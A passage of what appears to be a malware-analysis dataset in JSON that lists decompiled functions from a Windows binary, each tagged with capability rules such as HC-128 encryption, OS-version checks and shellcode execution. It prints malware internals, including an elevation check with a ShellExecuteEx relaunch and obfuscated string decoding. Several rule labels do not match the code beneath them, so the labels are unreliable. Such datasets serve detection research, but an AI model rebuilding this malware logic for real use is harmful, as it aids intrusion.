        "decompiled_code": "\nuint32_t __cdecl fcn.00402065(uint hKey)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint pdwDataLen;\n    int32_t pbData;\n    \n    uVar2 = 0;\n    pbData = 0;\n    pdwDataLen = 4;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_CryptGetKeyParam)(hKey, 9, &pbData, &pdwDataLen, 0);\n    if (iVar1 != 0) {\n        uVar2 = pbData + 7U >> 3;\n    }\n    return uVar2;\n}\n",
        "token_count": 143
    },
    "004078c5": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.004078c5(int32_t *arg_8h, uint *arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uint var_4h;\n    \n    cVar1 = fcn.004076c0();\n    if (cVar1 == '\\0') {\n        iVar2 = 0;\n    }\n    else {\n        iVar2 = 0;\n        if (*arg_8h == 2) {\n            *arg_ch = 0x201049a;\n            arg_ch[3] = 2;\n            iVar2 = fcn.0040cf7b();\n            uVar4 = iVar2 + 7U >> 3;\n            arg_ch[2] = iVar2;\n            iVar2 = fcn.00406338(0);\n            fcn.0040a362(iVar2, uVar4);\n            arg_ch[4] = *(iVar2 + -4 + uVar4);\n            fcn.00406445();\n            fcn.0040a362(arg_ch + 5, uVar4);\n            uVar3 = fcn.00406ed8();\n            arg_ch[1] = uVar3;\n            fcn.0040a362(arg_ch + 5 + uVar4, uVar4);\n            iVar2 = uVar4 * 2 + 0x18;\n        }\n        else if (*arg_8h == 1) {\n            *arg_ch = 0x201049a;\n            arg_ch[3] = 1;\n            iVar2 = fcn.0040cf7b();\n            uVar4 = iVar2 + 7U >> 3;\n            arg_ch[2] = iVar2;\n            iVar2 = fcn.00406338(0);\n            fcn.0040a362(iVar2, uVar4);\n            arg_ch[4] = *(iVar2 + -4 + uVar4);\n            fcn.00406445();\n            fcn.0040a362(arg_ch + 5, uVar4);\n            uVar3 = fcn.00406ed8();\n            arg_ch[1] = uVar3;\n            iVar2 = uVar4 + 0x18;\n        }\n    }\n    return iVar2;\n}\n",
        "token_count": 508
    },
    "00407ab6": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint * fcn.00407ab6(int32_t param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *puVar4;\n    \n    puVar4 = NULL;\n    uVar3 = *(param_1 + 8) + 7U >> 3;\n    if (*(param_1 + 0xc) == 1) {\n        if (param_2 == uVar3 + 0x18) {\n            puVar4 = fcn.00406338(8);\n            if (puVar4 != NULL) {\n                *puVar4 = 1;\n                uVar1 = fcn.0040a235();\n                puVar4[2] = uVar1;\n                iVar2 = fcn.00406338(8);\n                *(iVar2 + -4 + uVar3) = *(param_1 + 0x10);\n                fcn.0040a32a(iVar2, uVar3);\n                fcn.00406445();\n                uVar1 = fcn.0040a235();\n                puVar4[1] = uVar1;\n                fcn.0040a32a(param_1 + 0x14, uVar3);\n            }\n        }\n    }\n    else if ((*(param_1 + 0xc) == 2) && (param_2 == uVar3 * 2 + 0x18)) {\n        puVar4 = fcn.00406338(8);\n        if (puVar4 != NULL) {\n            *puVar4 = 2;\n            uVar1 = fcn.0040a235();\n            puVar4[2] = uVar1;\n            iVar2 = fcn.00406338(8);\n            *(iVar2 + -4 + uVar3) = *(param_1 + 0x10);\n            fcn.0040a32a(iVar2, uVar3);\n            fcn.00406445();\n            uVar1 = fcn.0040a235();\n            puVar4[1] = uVar1;\n            fcn.0040a32a(param_1 + 0x14, uVar3);\n            uVar1 = fcn.0040a235();\n            puVar4[3] = uVar1;\n            fcn.0040a32a(param_1 + 0x14 + uVar3, uVar3);\n        }\n    }\n    return puVar4;\n}\n",
        "token_count": 551
    },
    "00407c6d": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407c6d(int32_t s2)\n\n{\n    uint32_t in_EAX;\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t unaff_ESI;\n    uint32_t var_4h;\n    \n    uVar2 = *(unaff_ESI + 0x10) + in_EAX * 8;\n    uVar1 = *(unaff_ESI + 0x10) >> 3 & 0x3f;\n    *(unaff_ESI + 0x10) = uVar2;\n    if (uVar2 < in_EAX << 3) {\n        *(unaff_ESI + 0x14) = *(unaff_ESI + 0x14) + 1;\n    }\n    *(unaff_ESI + 0x14) = *(unaff_ESI + 0x14) + (in_EAX >> 0x1d);\n    var_4h = -uVar1 + 0x40;\n    if (in_EAX < var_4h) {\n        var_4h = 0;\n    }\n    else {\n        sub.ntdll.dll_memcpy(uVar1 + 0x18 + unaff_ESI, s2, var_4h);\n        fcn.00407d01(unaff_ESI);\n        for (uVar2 = -uVar1 + 0x7f; uVar2 < in_EAX; uVar2 = uVar2 + 0x40) {\n            fcn.00407d01(unaff_ESI);\n            var_4h = var_4h + 0x40;\n        }\n        uVar1 = 0;\n    }\n    sub.ntdll.dll_memcpy(uVar1 + 0x18 + unaff_ESI, var_4h + s2, in_EAX - var_4h);\n    return;\n}\n",
        "token_count": 416
    },
    "004083cf": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004083cf(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    char cVar1;\n    uint uVar2;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_ch;\n    \n    uVar2 = 0;\n    cVar1 = fcn.00409e78(arg_8h, arg_ch);\n    if ((cVar1 != '\\0') && (cVar1 = fcn.00409e9f(arg_10h, 0x10),  cVar1 != '\\0')) {\n        var_50h = 0;\n        var_54h = 0;\n        var_64h = 0x67452301;\n        var_60h = 0xefcdab89;\n        var_5ch = 0x98badcfe;\n        var_58h = 0x10325476;\n        fcn.00407c6d(arg_8h);\n        fcn.0040839a(&var_54h);\n        fcn.00407c6d(0x4148e8);\n        fcn.00407c6d(&var_ch);\n        fcn.0040839a(&var_64h);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 318
    },
    "0040d3ac": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040d3ac(int32_t arg_8h, uint32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    \n    iVar2 = fcn.0040cf7b();\n    uVar3 = iVar2 + 7U >> 3;\n    uVar4 = 0;\n    iVar2 = arg_14h + -1;\n    if (arg_ch != 0) {\n        do {\n            if (iVar2 < 0) {\n                return uVar3;\n            }\n            uVar1 = *(arg_8h + uVar4 * 4);\n            arg_14h = 0;\n            do {\n                if (0x1f < arg_14h) break;\n                *(iVar2 + arg_10h) = uVar1 >> (arg_14h & 0x1f);\n                iVar2 = iVar2 + -1;\n                arg_14h = arg_14h + 8;\n            } while (-1 < iVar2);\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < arg_ch);\n    }\n    for (; -1 < iVar2; iVar2 = iVar2 + -1) {\n        *(iVar2 + arg_10h) = 0;\n    }\n    return uVar3;\n}\n",
        "token_count": 328
    },
    "0040e0e4": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040e0e4(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    uint32_t in_EAX;\n    uint16_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if (arg_10h != 0) {\n        uVar5 = 0;\n        uVar3 = in_EAX & 7;\n        uVar4 = 0;\n        if (uVar3 != 0) {\n            uVar5 = *((in_EAX >> 3) + arg_8h) >> (8U - uVar3 & 0x1f);\n            uVar4 = uVar3;\n        }\n        var_8h = in_EAX >> 3;\n        uVar3 = arg_10h + 7 >> 3;\n        iVar6 = 0;\n        if (uVar3 != 0) {\n            do {\n                if (iVar6 == uVar3 - 1) {\n                    var_4h = 8;\n                    if ((arg_10h & 7) != 0) {\n                        var_4h = arg_10h & 7;\n                    }\n                    uVar2 = *(iVar6 + arg_ch) >> (8 - var_4h & 0x1f) | uVar5 << var_4h;\n                    uVar4 = uVar4 + var_4h;\n                }\n                else {\n                    uVar2 = *(iVar6 + arg_ch) ^ uVar5 << 8;\n                    uVar4 = uVar4 + 8;\n                }\n                uVar5 = uVar2;\n                while ((iVar6 != uVar3 - 1 && 7 < uVar4 || (0 < uVar4 && iVar6 == uVar3 - 1))) {\n                    var_4h = 8;\n                    if (uVar4 < 9) {\n                        var_4h = uVar4;\n                    }\n                    cVar1 = uVar4;\n                    uVar4 = uVar4 - var_4h;\n                    *(var_8h + arg_8h) =\n                         (uVar2 >> (cVar1 - var_4h & 0x1f)) << (8 - var_4h & 0x1f) & 0xff00 >> (var_4h & 0x1f);\n                    var_8h = var_8h + 1;\n                }\n                iVar6 = iVar6 + 1;\n            } while (iVar6 < uVar3);\n        }\n    }\n    return;\n}\n",
        "token_count": 636
    },
    "0040e4b1": {
        "rules": [
            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
            "hash data using aphash/10489b186fc44711a1078750698db7a9"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040e4b1(int32_t s2, uint32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    uint32_t arg_10h_00;\n    int32_t unaff_ESI;\n    int32_t iVar3;\n    uint32_t var_4h;\n    \n    if (unaff_ESI == 0) {\n        iVar3 = 3;\n    }\n    else if (*(unaff_ESI + 0x10c) == 0) {\n        iVar3 = 5;\n    }\n    else if (s2 == 0) {\n        iVar3 = 8;\n    }\n    else {\n        var_4h = 0;\n        if ((arg_10h != 0) || (arg_ch != 0)) {\n            do {\n                arg_10h_00 = 0x1000 - *(unaff_ESI + 0x3b7c);\n                if ((arg_10h == arg_ch < var_4h) && (arg_ch - var_4h < arg_10h_00)) {\n                    arg_10h_00 = arg_ch - var_4h;\n                }\n                if ((((arg_10h_00 & 7) == 0) && ((*(unaff_ESI + 0x3b7c) & 7) == 0)) && ((var_4h & 7) == 0)) {\n                    sub.ntdll.dll_memcpy\n                              ((*(unaff_ESI + 0x3b7c) >> 3) + 0x378 + unaff_ESI, (var_4h >> 3) + s2, arg_10h_00 >> 3);\n                }\n                else {\n                    fcn.0040e0e4(unaff_ESI + 0x378, (var_4h >> 3) + s2, arg_10h_00);\n                }\n                var_4h = var_4h + arg_10h_00;\n                *(unaff_ESI + 0x3b7c) = *(unaff_ESI + 0x3b7c) + arg_10h_00;\n                puVar1 = unaff_ESI + 0x110;\n                uVar2 = *puVar1;\n                *puVar1 = *puVar1 + arg_10h_00;\n                *(unaff_ESI + 0x114) = *(unaff_ESI + 0x114) + CARRY4(uVar2, arg_10h_00);\n                if (((*(unaff_ESI + 0x3b7c) == 0x1000) && ((arg_10h != 0 || (var_4h < arg_ch)))) &&\n                   (iVar3 = fcn.0040e358(unaff_ESI, 1, 0),  iVar3 != 0)) {\n                    return iVar3;\n                }\n            } while ((arg_10h != 0) || (var_4h < arg_ch));\n        }\n        iVar3 = 0;\n    }\n    return iVar3;\n}\n",
        "token_count": 698
    },
    "00402554": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nvoid fcn.00402554(void)\n\n{\n    code *pcVar1;\n    int16_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uStack668;\n    uint uStack664;\n    uint uStack660;\n    uint uStack656;\n    uchar *puStack652;\n    uint uStack632;\n    code *pcStack628;\n    uchar auStack580 [4];\n    uint uStack576;\n    uint uStack564;\n    uchar auStack548 [4];\n    uchar *puStack544;\n    uchar auStack536 [532];\n    \n    pcStack628 = 0x100;\n    uStack632 = 0x40256f;\n    uStack632 = (*_sym.imp.KERNEL32.dll_GetCurrentThread)();\n    (*_sym.imp.KERNEL32.dll_SetThreadPriority)();\n    pcVar1 = _sym.imp.KERNEL32.dll_SetProcessShutdownParameters;\n    iVar3 = (*_sym.imp.KERNEL32.dll_SetProcessShutdownParameters)();\n    if (iVar3 == 0) {\n        puStack652 = 0x402593;\n        iVar3 = (*pcVar1)();\n        if (iVar3 == 0) {\n            puStack652 = 0x40259f;\n            (*pcVar1)();\n        }\n    }\n    puStack652 = &stack0xfffffdbc;\n    uStack656 = 0x4025ae;\n    sub.ntdll.dll_memset();\n    puStack544 = &stack0xfffffde8;\n    uStack576 = 0x4099df;\n    uStack564 = 0x400000;\n    do {\n        puStack652 = 0x4025e0;\n        fcn.004091a1(0x100, 0xff);\n        iVar2 = (*_sym.imp.USER32.dll_RegisterClassExW)();\n    } while (iVar2 == 0);\n    puStack652 = 0x402600;\n    (*_sym.imp.USER32.dll_UnregisterClassW)();\n    puStack652 = &stack0xfffffd88;\n    uStack632 = 0;\n    pcStack628 = fcn.0040253d;\n    uStack660 = 0;\n    uStack656 = 0x402640;\n    (*_sym.imp.USER32.dll_RegisterClassW)();\n    uStack656 = 0;\n    uStack664 = 0;\n    uStack668 = 0;\n    uVar4 = (*_sym.imp.USER32.dll_CreateWindowExW)(0, &stack0xfffffddc, 0, 0x4cf0000, 1, 1, 1, 1);\n    do {\n        iVar3 = (*_sym.imp.USER32.dll_PeekMessageW)(&stack0xfffffd7c, uVar4, 0, 0, 1);\n        if (iVar3 != 0) {\n            (*_sym.imp.USER32.dll_TranslateMessage)(&stack0xfffffd68);\n            (*_sym.imp.USER32.dll_DispatchMessageW)(&stack0xfffffd64);\n        }\n        iVar3 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x42e450, 1);\n    } while (iVar3 == 0x102);\n    return;\n}\n",
        "token_count": 698
    },
    "00408c16": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00408c16(uint pbBinary, uint cbBinary, char *pszString)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    char *pcVar3;\n    int32_t pcchString;\n    \n    pcchString = in_EAX;\n    iVar2 = (*_sym.imp.CRYPT32.dll_CryptBinaryToStringA)(pbBinary, cbBinary, 0x80000001, pszString, &pcchString);\n    pcVar3 = pszString;\n    iVar1 = pcchString;\n    if (iVar2 != 0) {\n        for (; iVar2 = iVar1,  pcchString != 0; pcchString = pcchString + -1) {\n            if (*pcVar3 == '\\n') {\n                iVar2 = iVar2 + -1;\n                if (pcchString + -1 == 0) break;\n                (*_sym.imp.ntdll.dll_memmove)(pcVar3, pcVar3 + 1, pcchString + -1);\n            }\n            else {\n                pcVar3 = pcVar3 + 1;\n            }\n            iVar1 = iVar2;\n        }\n        pszString[iVar2] = '\\0';\n    }\n    return iVar2;\n}\n",
        "token_count": 279
    },
    "0040ab36": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nint32_t __thiscall fcn.0040ab36(uint32_t param_1, char param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = -1;\n    if ((param_2 - 0x30U < 10) && (param_2 <= param_1 + 0x2f)) {\n        iVar1 = param_2 - 0x30;\n    }\n    else if (10 < param_1) {\n        if ((param_2 + 0xbfU < 0x1a) && (param_2 <= param_1 + 0x36)) {\n            iVar1 = param_2 - 0x37;\n        }\n        if ((param_2 + 0x9fU < 0x1a) && (param_2 <= param_1 + 0x56)) {\n            iVar1 = param_2 - 0x57;\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 209
    },
    "00408fee": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nchar __fastcall fcn.00408fee(char param_1)\n\n{\n    char cVar1;\n    \n    cVar1 = -1;\n    if (param_1 - 0x30U < 10) {\n        return param_1 + -0x30;\n    }\n    if (param_1 + 0x9fU < 6) {\n        return param_1 + -0x57;\n    }\n    if (param_1 + 0xbfU < 6) {\n        cVar1 = param_1 + -0x37;\n    }\n    return cVar1;\n}\n",
        "token_count": 131
    },
    "00409952": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint fcn.00409952(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint lpVersionInformation;\n    uint32_t s;\n    uint ReturnLength;\n    uint TokenInformation;\n    uint TokenHandle;\n    \n    uVar3 = 0;\n    lpVersionInformation = 0x114;\n    sub.ntdll.dll_memset(&s, 0, 0x110);\n    (*_sym.imp.KERNEL32.dll_GetVersionExW)(&lpVersionInformation);\n    if (s < 6) {\n        uVar3 = fcn.004098f8();\n    }\n    else {\n        TokenHandle = 0;\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar1);\n        if (iVar2 != 0) {\n            iVar2 = (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x14, &TokenInformation, 4, &ReturnLength)\n            ;\n            if (iVar2 != 0) {\n                uVar3 = TokenInformation;\n            }\n            fcn.00408489();\n        }\n    }\n    return uVar3;\n}\n",
        "token_count": 278
    },
    "0040f475": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nint32_t fcn.0040f475(uint param_1)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    bool bVar6;\n    int32_t iStack4;\n    \n    iVar4 = 0;\n    iStack4 = 0;\n    cVar1 = fcn.00409f19(param_1);\n    iVar3 = iVar4;\n    if ((((cVar1 != '\\0') && (cVar1 = fcn.0040f21e(),  cVar1 != '\\0')) && (*(in_EAX + 0x14) == 5)) &&\n       (iVar2 = fcn.0040f246(param_1),  iVar2 != 0)) {\n        iVar5 = *(in_EAX + 0x10);\n        while ((iVar3 = iVar4,  iVar5 != 0 &&\n               ((iVar3 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(*(iVar5 + 0x1c), iVar2),  iVar3 != 0 ||\n                (bVar6 = iStack4 != 0,  iVar3 = iVar5,  iStack4 = iStack4 + -1,  bVar6))))) {\n            iVar5 = *(iVar5 + 8);\n        }\n        fcn.00406445();\n    }\n    return iVar3;\n}\n",
        "token_count": 321
    },
    "00403675": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00403675(int32_t *arg_8h, int32_t *arg_ch, uint lpString2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *in_EAX;\n    uint32_t uVar3;\n    int32_t iVar4;\n    \n    uVar3 = (*_sym.imp.KERNEL32.dll_lstrlenW)(lpString2);\n    *in_EAX = *in_EAX + -6 + uVar3;\n    if (6 < uVar3) {\n        iVar1 = *arg_8h;\n        iVar2 = *arg_ch;\n        iVar4 = fcn.004063a5();\n        *arg_8h = iVar4;\n        *arg_ch = iVar4 + (iVar2 - iVar1 >> 1) * 2;\n    }\n    (*_sym.imp.KERNEL32.dll_lstrcpyW)(*arg_ch, lpString2);\n    *arg_ch = *arg_ch + uVar3 * 2;\n    return;\n}\n",
        "token_count": 224
    },
    "00404653": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00404653(void)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint var_160h;\n    uint32_t s;\n    uint pExecInfo;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_24h;\n    int32_t var_8h;\n    uint var_1h;\n    \n    sub.ntdll.dll_memset(&s, 0, 0x118);\n    fcn.00409775();\n    if (5 < s) {\n        var_1h._0_1_ = '\\x01';\n        cVar1 = fcn.004045da();\n        if (cVar1 == '\\0') {\n            sub.ntdll.dll_memset(&var_3ch, 0, 0x38);\n            pExecInfo = 0x3c;\n            var_3ch = 0xc400;\n            var_34h = fcn.00406209(0x412568, 5, 0x5719337c);\n            var_30h = 0x42e780;\n            var_38h = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n            var_24h = 1;\n            iVar2 = (*_sym.imp.SHELL32.dll_ShellExecuteExW)(&pExecInfo);\n            if ((iVar2 != 0) && (var_8h != 0)) {\n                var_1h._0_1_ = '\\0';\n            }\n            cVar1 = fcn.0040457a();\n            if (cVar1 != '\\0') {\n                (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\n            }\n            if (var_1h == '\\0') {\n                return;\n            }\n        }\n        fcn.004023a3();\n    }\n    return;\n}\n",
        "token_count": 438
    },
    "004089af": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nbool fcn.004089af(void)\n\n{\n    int32_t iVar1;\n    uint lpVersionInformation;\n    uint32_t s;\n    \n    sub.ntdll.dll_memset(&s, 0, 0x110);\n    lpVersionInformation = 0x114;\n    (*_sym.imp.KERNEL32.dll_GetVersionExW)(&lpVersionInformation);\n    if (s < 6) {\n        iVar1 = fcn.004097f5();\n    }\n    else {\n        iVar1 = fcn.004097f5();\n        if (iVar1 == 0) {\n            return false;\n        }\n        iVar1 = fcn.00409952();\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 154
    },
    "0040383a": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * __cdecl fcn.0040383a(uchar *lpString, int32_t *arg_ch)\n\n{\n    uchar uVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint uVar6;\n    uint *lpString2;\n    uint8_t *puVar7;\n    uint extraout_ECX;\n    uint32_t uVar8;\n    uint32_t arg_10h;\n    ulong uVar9;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    int32_t var_4ch;\n    int32_t iStack75;\n    uchar uStack71;\n    uint var_40h;\n    uint uStack63;\n    uchar uStack59;\n    int32_t var_34h;\n    int32_t iStack51;\n    uchar uStack47;\n    int32_t var_28h;\n    int32_t iStack39;\n    uchar uStack35;\n    int32_t var_1ch;\n    int32_t iStack27;\n    uchar uStack23;\n    uint32_t var_10h;\n    uchar *var_ch;\n    int32_t var_8h;\n    uchar *var_4h;\n    \n    iVar3 = (*_sym.imp.KERNEL32.dll_lstrlenA)(lpString);\n    var_8h = iVar3;\n    var_ch = fcn.00406338(8);\n    var_4h = var_ch;\njoined_r0x0040386a:\n    do {\n        while( true ) {\n            while( true ) {\n                while( true ) {\n                    while( true ) {\n                        while( true ) {\n                            while( true ) {\n                                if (iVar3 == 0) {\n                                    if (arg_ch != NULL) {\n                                        *arg_ch = var_8h;\n                                    }\n                                    return var_ch;\n                                }\n                                uVar4 = fcn.00405e30(0x412344, 10, 0xa76732af, 0);\n                                pcVar2 = _sym.imp.SHLWAPI.dll_StrCmpNIA;\n                                iVar5 = (*_sym.imp.SHLWAPI.dll_StrCmpNIA)(lpString, uVar4, 10);\n                                if (iVar5 != 0) break;\n                                var_1ch._0_1_ = 0;\n                                uStack23 = 0;\n                                unique0x100009c3 = iVar5;\n                                iStack27 = iVar5;\n                                uVar4 = fcn.00405e30(0x412350, 2, 0x234959d6, 0);\n                                iVar5 = fcn.004089af();\n                                fcn.004093eb(&var_1ch, uVar4, iVar5 != 0);\n                                fcn.0040374f(&var_ch, &var_4h, &var_1ch, 10);\n                                lpString = lpString + 10;\n                                iVar3 = iVar3 + -10;\n                            }\n                            uVar4 = fcn.00405e30(0x412354, 8, 0xc15b1f22, 0);\n                            iVar5 = (*pcVar2)(lpString, uVar4, 8);\n                            if (iVar5 != 0) break;\n                            var_34h._0_1_ = 0;\n                            uStack47 = 0;\n                            unique0x100009b3 = iVar5;\n                            iStack51 = iVar5;\n                            uVar4 = fcn.00405e30(0x412350, 2, 0x234959d6, 0);\n                            iVar5 = fcn.0040877e();\n                            fcn.004093eb(&var_34h, uVar4, iVar5 != 0);\n                            fcn.0040374f(&var_ch, &var_4h, &var_34h, 8);\n                            lpString = lpString + 8;\n                            iVar3 = iVar3 + -8;\n                        }\n                        uVar4 = fcn.00405e30(0x412360, 0xc, 0x203fc241, 0);\n                        iVar5 = (*pcVar2)(lpString, uVar4, 0xc);\n                        if (iVar5 != 0) break;\n                        var_4ch._0_1_ = 0;\n                        uStack71 = 0;\n                        unique0x100009ab = iVar5;\n                        iStack75 = iVar5;\n                        uVar4 = fcn.00405e30(0x412370, 4, 0x6faefd4e, 0);\n                        fcn.004093eb(&var_4ch, uVar4, *0x414c14);\n                        fcn.0040374f(&var_ch, &var_4h, &var_4ch, 0xc);\n                        lpString = lpString + 0xc;\n                        iVar3 = iVar3 + -0xc;\n                    }\n                    uVar4 = fcn.00405e30(0x412378, 4, 0x872a486c, 0);\n                    iVar5 = (*pcVar2)(lpString, uVar4, 4);\n                    if (iVar5 != 0) break;\n                    var_28h._0_1_ = 0;\n                    uStack35 = 0;\n                    unique0x100009bb = iVar5;\n                    iStack39 = iVar5;\n                    uVar4 = fcn.00405e30(0x412380, 2, 0x14fa5e6b, 0);\n                    uVar6 = fcn.00403543();\n                    fcn.004093eb(&var_28h, uVar4, uVar6);\n                    fcn.0040374f(&var_ch, &var_4h, &var_28h, 4);\n                    lpString = lpString + 4;\n                    iVar3 = iVar3 + -4;\n                }\n                uVar4 = fcn.00405e30(0x412384, 7, 0x2f6760ab, 0);\n                iVar5 = (*pcVar2)(lpString, uVar4, 7);\n                if (iVar5 != 0) break;\n                uVar6 = 7;\n                uVar4 = fcn.00402aba(extraout_ECX);\n                fcn.0040374f(&var_ch, &var_4h, uVar4, uVar6);\n                lpString = lpString + 7;\n                iVar3 = iVar3 + -7;\n            }\n            uVar4 = fcn.00405e30(0x41238c, 0xd, 0x513754ca, 0);\n            iVar5 = (*pcVar2)(lpString, uVar4, 0xd);\n            if (iVar5 != 0) break;\n            uVar4 = 0xd;\n            lpString2 = fcn.00403ed2();\ncode_r0x00403c79:\n            fcn.0040374f(&var_ch, &var_4h, lpString2, uVar4);\n            lpString = lpString + 0xd;\n            iVar3 = iVar3 + -0xd;\n        }\n        uVar4 = fcn.00405e30(0x41239c, 9, 0xf594956f, 0);\n        iVar5 = (*pcVar2)(lpString, uVar4, 9);\n        if (iVar5 == 0) {\n            puVar7 = fcn.00401adc();\n            uVar4 = fcn.00405e30(0x4123a8, 0x18, 0xae51de60, 0);\n            fcn.004093eb(&var_b8h, uVar4, *puVar7);\n            fcn.0040374f(&var_ch, &var_4h, &var_b8h, 9);\n            iVar3 = iVar3 + -9;\n            lpString = lpString + 9;\n            goto joined_r0x0040386a;\n        }\n        uVar4 = fcn.00405e30(0x4123c4, 0xd, 0x24cd5cc0, 0);\n        iVar5 = (*pcVar2)(lpString, uVar4, 0xd);\n        if (iVar5 == 0) {\n            var_b4h = 1;\n            var_b0h = 1;\n            var_ach = 500;\n            var_a8h = 500;\n            var_54h = 0xffffffff;\n            var_a4h = 1000;\n            var_a0h = 1000;\n            var_9ch = 2000;\n            var_98h = 2000;\n            var_94h = 5000;\n            var_90h = 5000;\n            var_8ch = 10000;\n            var_88h = 10000;\n            var_84h = 20000;\n            var_80h = 20000;\n            var_7ch = 50000;\n            var_78h = 50000;\n            var_74h = 100000;\n            var_70h = 100000;\n            var_6ch = 200000;\n            var_68h = 200000;\n            var_64h = 500000;\n            var_60h = 500000;\n            var_b8h = 0;\n            var_5ch = 1000000;\n            var_58h = 1000000;\n            uVar9 = fcn.00404fb5();\n            uVar8 = 0;\n            do {\n                if (((&var_b8h)[uVar8 * 2] <= uVar9) && (arg_10h = uVar8,  uVar9 < (&var_b4h)[uVar8 * 2])) break;\n                uVar8 = uVar8 + 1;\n                arg_10h = uVar9 >> 0x20;\n            } while (uVar8 < 0xd);\n            var_40h._0_1_ = 0;\n            stack0xffffffbd = 0;\n            uStack63 = 0;\n            uStack59 = 0;\n            uVar4 = fcn.00405e30(0x412380, 2, 0x14fa5e6b, 0);\n            fcn.004093eb(&var_40h, 